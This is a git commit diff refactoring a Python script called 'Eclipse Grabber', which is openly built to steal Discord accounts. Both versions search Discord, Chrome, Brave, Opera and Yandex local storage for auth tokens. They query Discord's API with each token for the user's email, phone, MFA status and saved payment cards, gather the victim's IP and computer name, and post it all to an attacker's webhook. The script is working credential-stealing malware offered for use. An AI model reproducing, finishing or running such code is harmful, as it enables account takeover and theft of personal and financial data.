bb48ac8cf03175062215982b82efaad71e034045
Kerago <93339246+Kerago@users.noreply.github.com>
2022-02-03 20:08:42 +0100

    Update eclipse-grabber.py

--- code/eclipse-grabber.py
+++ code/eclipse-grabber.py
@@ -1,77 +1,30 @@
 import os
 import ssl
-from getpass import getuser
-from json import dumps, loads
 from platform import node as get_pc_name
-from re import findall
 from sys import platform as OS
-from typing import List, Optional
+from getpass import getuser
+from re import findall
+from json import loads, dumps
+from typing import Optional, List
 from urllib.request import Request, urlopen
 
-# Constants
+# Important Variables
 WEBHOOK = "{WEBHOOK}"
-IPIFY_API_URL = "https://api.ipify.org?format=json"
 DISCORD_API_URL = "https://discordapp.com/api/v6/users/@me"
-DISCORD_AVATAR_URL = "https://cdn.discordapp.com/avatars/{id}/{avatar_id}"
-DISCORD_BILLING_URL = DISCORD_API_URL + "/billing/payment-sources"
-USER_AGENT = (
-    "Mozilla/5.0 (X11; Linux x86_64) "
-    "AppleWebKit/537.11 (KHTML, like Gecko) "
-    "Chrome/23.0.1271.64 Safari/537.11"
-)
-CONTENT_TYPE = "application/json"
+DISCORD_AVATARS_URL = "https://cdn.discordapp.com/avatars/"
+IPIFY_API_URL = "https://api.ipify.org?format=json"
 
+headers = {
+        "Content-Type": "application/json",
+        "User-Agent": ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11")
+    }
 
 ssl._create_default_https_context = ssl._create_unverified_context
 
+#####################################################################
 
-def pc_info():
-
-    api_resp = open_url(IPIFY_API_URL)
-    return (
-        f'IP: {api_resp.get("ip") if api_resp else None}\n'
-        f"Username: {getuser()}\n"
-        f"PC Name: {get_pc_name()}\n"
-    )
-
-
-def get_paths() -> dict:
-
-    if OS == "win32":  # Windows
-        local_app_data = os.getenv("LOCALAPPDATA")
-        app_data = os.getenv("APPDATA")
-        chromium_path = ["User Data", "Default"]
-
-    if OS == "darwin":  # OSX
-        local_app_data = os.path.expanduser("~/Library/Application Support")
-        app_data = os.path.expanduser("~/Library/Application Support")
-        chromium_path = ["Default"]
-
-    paths = {
-        "Discord": [app_data, "Discord"],
-        "Discord Canary": [app_data, "discordcanary"],
-        "Discord PTB": [app_data, "discordptb"],
-        "Google Chrome": [local_app_data, "Google", "Chrome", *chromium_path],
-        "Brave": [local_app_data, "BraveSoftware", "Brave-Browser", *chromium_path],
-        "Yandex": [local_app_data, "Yandex", "YandexBrowser", *chromium_path],
-        "Opera": [app_data, "Opera Software", "Opera Stable"],
-    }
-
-    for app_name, path in paths.items():
-        paths[app_name] = os.path.join(*path, "Local Storage", "leveldb")
-
-    return paths
-
-
-def open_url(url: str,
-             token: Optional[str] = None,
-             data: Optional[bytes] = None) -> Optional[dict]:
-
-    headers = {
-        "Content-Type": CONTENT_TYPE,
-        "User-Agent": USER_AGENT,
-    }
-
+def open_url(url: str, token: Optional[str] = None, data: Optional[bytes] = None) -> Optional[dict]:
+    
     if token:
         headers.update({"Authorization": token})
     try:
@@ -80,46 +33,81 @@ def open_url(url: str,
             return loads(result)
     except Exception:
         pass
+ 
+class Computer():
+
+    def __init__(self):
+        
+        api_resp: dict = open_url(self.IPIFY_API_URL)
+        self.ip: Optional(str) = api_resp.get("ip") if api_resp else None
+        self.name: str = get_pc_name().split(".")[0] if get_pc_name().find('.') else get_pc_name()
+        self.username: str = getuser()
 
 
-class Account:
+    def get_paths(self) -> dict:
+
+        if OS == "win32":  # Windows
+            LOCAL = os.getenv("LOCALAPPDATA")
+            ROAMING = os.getenv("APPDATA")
+        if OS == "darwin":  # OSX
+            LOCAL = os.path.expanduser("~/Library/Application Support")
+            ROAMING = os.path.expanduser("~/Library/Application Support")
+        PATHS = {
+            "Discord": os.path.join(ROAMING, "Discord"),
+            "Discord Canary": os.path.join(ROAMING, "discordcanary"),
+            "Discord PTB": os.path.join(ROAMING, "discordptb"),
+        }
+
+        if OS == "darwin":  # OSX
+            PATHS.update({
+                "Google Chrome": os.path.join(LOCAL, "Google", "Chrome", "Default"),
+                "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "Default")
+            })
+
+        if OS == "win32":  # Windows
+            PATHS.update({
+                "Google Chrome": os.path.join(LOCAL, "Google", "Chrome", "User Data", "Default"),
+                "Opera": os.path.join(ROAMING, "Opera Software", "Opera Stable"),
+                "Brave": os.path.join(LOCAL, "BraveSoftware", "Brave-Browser", "User Data", "Default"),
+                "Yandex": os.path.join(LOCAL, "Yandex", "YandexBrowser", "User Data", "Default")
+            })
+
+        return PATHS
+
+
+class Account():
 
     def __init__(self, token: str, token_location: str):
-        self.token = token
-        self.token_location = token_location
-        self.account_data = open_url(DISCORD_API_URL, self.token)
-        self.billing_data = open_url(DISCORD_BILLING_URL, self.token)
-
-        if self.account_data:
-            self.name = self.account_data.get("username")
-            self.discriminator = self.account_data.get("discriminator")
-            self.id = self.account_data.get("id")
-            self.avatar_url = DISCORD_AVATAR_URL.format(
-                id=self.id, avatar_id=self.account_data.get('avatar')
-            )
-
-    def account_info(self) -> str:
-
+        
+        self.token: str = token
+        self.token_location: str = token_location
+        self.account_data: dict = open_url(self.DISCORD_API_URL, self.token)
+        
         if not self.account_data:
-            return "None"
+            return
 
-        return (
-            f"Email: {str(self.account_data.get('email'))}\n"
-            f"Phone: {str(self.account_data.get('phone'))}\n"
-            f"Nitro: {'Enabled' if bool(self.account_data.get('premium_type')) else 'Disabled'}\n"
-            f"MFA: {'Enabled' if bool(self.account_data.get('mfa_enabled')) else 'Disabled'}\n"
-            f"Lang: {str(self.account_data.get('locale')).capitalize()}"
-        )
+        self.name: str = self.account_data.get('username')
+        self.discriminator = self.account_data.get('discriminator')
+        self.id: str = self.account_data.get('id')
+        self.email: str = self.account_data.get('email')
+        self.phone: str = self.account_data.get('phone')
+        self.mfa: bool = self.account_data.get('mfa_enabled')
+        self.locale: str = self.account_data.get('locale')
+        self.nitro: bool = bool(self.account_data.get('premium_type'))
+        self.avatar_id: str = self.account_data.get('avatar')
+        self.avatar_url: str = (self.DISCORD_AVATARS_URL + f"/{self.id}/{self.avatar_id}")
+        self.billing_data: str = open_url(self.DISCORD_API_URL + "/billing/payment-sources", self.token)
+
 
     def billing_info(self) -> List[str]:
-
+        
         if not self.billing_data:
             return "None"
 
-        info = []
-
+        billing_info = []
+        
         for bill in self.billing_data:
-            info.append(
+            billing_info.append(
                 f"Id: {str(bill.get('id'))}\n"
                 f"Owner: {str(bill.get('billing_address').get('name').title())}\n"
                 f"Postal Code: {str(bill.get('billing_address').get('postal_code'))}\n"
@@ -129,42 +117,59 @@ class Account:
                 f"Expires: {str(bill.get('expires_month'))}"
                 f"/{str(bill.get('expires_year'))}\n"
                 f"Country: {str(bill.get('country'))}"
-            )
-        return info
+                )
+        return billing_info
 
 
-def field(title: str, text: str, inline: bool = True) -> str:
-
+def field_former(title: str, text: str, inline: bool = True) -> str:
+    
     return {
         "name": f"**{title} Info**",
         "value": str(text),
         "inline": bool(inline)
-    }
+        }
 
 
-def embed_info(accounts: List[Account]) -> List[dict]:
-
+def embed_accounts_info(accounts: List[Account], host: Computer) -> List[dict]:
+    
     embeds = []
+    
     for account in accounts.values():
-        fields = [
-            field("Account", account.account_info()),
-            field("PC", pc_info()),
-            field("Token", account.token, False)
-        ]
+        account_info = (
+            f'Email: {account.email}\n'
+            f'Phone: {account.phone}\n'
+            f"Nitro: {'Enabled' if account.nitro else 'Disabled'}\n"
+            f"MFA: {'Enabled' if account.mfa else 'Disabled'}\n"
+            f"Lang: {str(account.locale).capitalize()}"
+            )
+        
+        pc_info = (
+            f'IP: {host.ip}\n'
+            f'Username: {host.username}\n'
+            f'PC Name: {host.name}\n'
+            f'Token App: {account.token_location}')
 
+        fields = []
+        fields.append(field_former("Account", account_info))
+        fields.append(field_former("PC", pc_info))
+        
         if account.billing_data:
-            fields.insert(-1, field("Billing", account.billing_info()[0]))
+            fields.append(field_former("Billing", account.billing_info()[0]))
+            
+        fields.append(field_former("Token", account.token, False))
 
         embeds.append({
-            "color": 0x6A5ACD,
+            "color": 0xfabd2f,
             "fields": fields,
-            "footer": {"text": "Made by @3ct0s and @JM1k1"},
             "author": {
                 "name": (
-                    f"{account.name}#{account.discriminator} "
+                    f"{account.name}#{account.discriminator}"
                     f"({account.id})"
-                ),
+                         ),
                 "icon_url": account.avatar_url
+            },
+            "footer": {
+                "text": "Created by @3ct0s and @JM1k1!",
             }
         })
     return embeds
@@ -178,47 +183,52 @@ def send_webhook(embeds: List[dict], WEBHOOK_URL: str):
         "username": "Eclipse Grabber",
         "avatar_url": "https://imgur.com/Ymo8GEe.png"
     }
-
+    
     data = dumps(webhook).encode()
     return open_url(WEBHOOK_URL, None, data)
 
 
 def get_tokens(path: str) -> List[str]:
-
+    
     tokens = []
-
+    
     for file_name in os.listdir(path):
         if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
             continue
-        content = open(os.path.join(path, file_name), errors="ignore")
-
-        for line in map(str.strip, content.readlines()):
+        lines = open(os.path.join(path, file_name),
+                     errors="ignore").readlines()
+        
+        for line in map(str.strip, lines):
             for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                           r"mfa\.[\w-]{84}"):
                 for token in findall(regex, line):
                     tokens.append(token)
-    return tokens
+    return tokens 
 
 
-def get_accounts(paths: dict) -> dict:
 
+def get_accounts(host: Computer) -> dict:
+    
     accounts = {}
-
-    for app_name, path in paths.items():
+    
+    for app_name, path in host.get_paths().items():
+        path = os.path.join(path, "Local Storage", "leveldb")
         if not os.path.exists(path):
             continue
+        
         for token in get_tokens(path):
             account = Account(token, app_name)
-            if account.account_data and account.id not in accounts.keys():
+            if not account.account_data or account.id in accounts.keys():
+                continue
+            else:
                 accounts.update({account.id: account})
     return accounts
 
-
 def main(WEBHOOK_URL: str):
 
-    paths = get_paths()
-    accounts = get_accounts(paths)
-    embeds = embed_info(accounts)
+    host = Computer()
+    accounts = get_accounts(host)
+    embeds = embed_accounts_info(accounts, host)
     send_webhook(embeds, WEBHOOK_URL)
 
 
